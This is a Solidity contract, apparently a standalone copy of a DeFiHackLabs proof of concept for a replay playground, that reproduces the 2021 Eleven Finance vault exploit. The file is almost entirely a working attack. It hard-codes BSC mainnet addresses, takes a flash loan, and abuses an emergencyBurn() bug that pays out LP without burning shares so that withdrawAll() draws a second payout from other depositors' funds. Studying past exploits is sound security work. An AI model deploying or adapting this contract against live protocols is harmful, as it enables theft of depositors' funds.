// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-06-Eleven).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `Eleven is Test`
// contract: testExploit() pranks the attacker EOA and triggers an ApeSwap pair
// flash swap; the `pancakeCall` callback + the whole `attack()` body live on the
// test contract itself, so there is no standalone contract to deploy. This file
// is a faithful, self-contained copy of that inline attack (testExploit body →
// run(); pancakeCall → attack() copied verbatim) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/Eleven_exp.sol.
//
// Root cause: ElevenNeverSellVault.emergencyBurn() pays the caller their full
// underlying LP balance but NEVER burns the caller's vault shares (the
// legitimate withdraw() does _burn). After emergencyBurn() the attacker holds
// BOTH the LP back AND their full share balance, so a follow-up withdrawAll()
// burns those shares for a SECOND LP payout — drawn from the commingled
// MasterMind stake (other depositors' funds). deposit() mints shares 1:1 with LP
// (getPricePerFullShare hard-coded to 1e18), so the duplicated claim is exactly
// equal to the deposited position.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IElevenNeverSellVault {
    function depositAll() external;
    function emergencyBurn() external;
    function withdrawAll() external;
}

contract ElevenDrain {
    IPancakeRouter internal constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair internal constant cake_LP = IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);
    IERC20 internal constant nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);
    IERC20 internal constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address internal constant ape_lp = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;
    IElevenNeverSellVault internal constant vault =
        IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);

    // Mirror test setUp(): approve the router, the ApeSwap flash pair, the vault
    // and the cake_LP pair to pull tokens from this contract.
    constructor() {
        busd.approve(address(router), type(uint256).max);
        busd.approve(ape_lp, type(uint256).max);
        nrv.approve(address(router), type(uint256).max);
        IERC20(address(cake_LP)).approve(address(vault), type(uint256).max);
        IERC20(address(cake_LP)).approve(address(router), type(uint256).max);
    }

    // Mirror testExploit(): take a flashloan from ApeSwap. The pair's
    // pancakeCall callback runs attack() below and repays within this tx.
    function run() external {
        IPancakePair(ape_lp).swap(0, 953_869_628_210_538_003_222_368, address(this), "Gimme da loot");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        attack();
    }

    function attack() public {
        // BUSD and NRV paths.
        address[] memory path_1 = new address[](2);
        path_1[0] = address(busd);
        path_1[1] = address(nrv);
        address[] memory path_2 = new address[](2);
        path_2[0] = address(nrv);
        path_2[1] = address(busd);

        // Swap BUSD for NRV.
        router.swapExactTokensForTokens(
            340_631_231_201_021_740_166_440,
            474_378_756_062_092_796_179_091,
            path_1,
            address(this),
            block.timestamp + 500 seconds
        );

        // Add liquidity to PancakeSwap and receive LP tokens.
        router.addLiquidity(
            address(nrv),
            address(busd),
            474_378_756_062_092_796_179_091,
            366_962_025_372_860_720_681_305,
            474_378_756_062_092_796_179_091,
            366_962_025_372_860_720_681_305,
            address(this),
            block.timestamp + 500 seconds
        );

        // Deposit LP tokens into the Eleven vault (mints 1:1 vault shares).
        vault.depositAll();

        // The bug: emergencyBurn pays out the underlying LP but burns NO shares.
        vault.emergencyBurn();

        // Burn the still-intact shares for a SECOND LP payout (other LPs' funds).
        vault.withdrawAll();

        // Remove liquidity from PancakeSwap.
        router.removeLiquidity(
            address(nrv),
            address(busd),
            823_030_594_158_097_624_422_918,
            449_328_228_768_287_545_012_441,
            347_583_855_261_065_794_904_977,
            address(this),
            block.timestamp + 500 seconds
        );

        // Swap NRV for BUSD.
        router.swapExactTokensForTokens(
            948_757_512_124_185_592_358_179,
            624_113_299_151_540_843_640_146,
            path_2,
            address(this),
            block.timestamp + 500 seconds
        );

        // Repay the flashloan.
        busd.transfer(ape_lp, 956_739_847_753_799_401_426_648);
    }
}
